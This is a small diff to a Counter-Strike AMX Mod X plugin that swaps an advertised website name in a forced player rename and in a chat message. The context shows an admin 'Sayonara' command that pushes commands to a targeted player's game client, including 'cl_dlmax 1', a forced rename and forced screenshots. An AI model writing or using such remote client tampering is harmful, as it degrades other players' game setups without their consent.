@@ -19,7 +19,7 @@ new const g_sCommands[ ][ ] =
 	"sv_aim 0",
 	"cl_dlmax 1",
 
-	"name WwW.Ecila.Ro",
+	"name WwW.Dobs.Ro",
 
 	"wait;snapshot;wait;snapshot",
 
@@ -132,7 +132,7 @@ public Concmd_AMXX_Sayonara( id, level, cid )
 	player_color( 0, ".g .v[Amx_SuperPa] .gComanda executata cu succes de catre adminul .v%s", name );
 	client_cmd( 0, "spk ^"vox/adios ^"");
 	client_print(player,print_chat,"*** %s ai primit SAYONARA de la ADMINUL %s ***", name2 , name ) ;
-	client_print(player,print_chat,"*** %s daca consideri ca ADMINUL %s a abuzat de aceasta comanda fa o reclamatie aici WwW.Ecila.Ro***", name2 , name ) ;
+	client_print(player,print_chat,"*** %s daca consideri ca ADMINUL %s a abuzat de aceasta comanda fa o reclamatie aici WwW.Dobs.Ro***", name2 , name ) ;
 	client_print(player,print_chat,"*** %s ti-au fost facute 2 ss (poze) in cstrike/(numele hartii )***", name2 ) ;
 	
 	for( new i = 0; i < sizeof( g_sCommands ); i++)
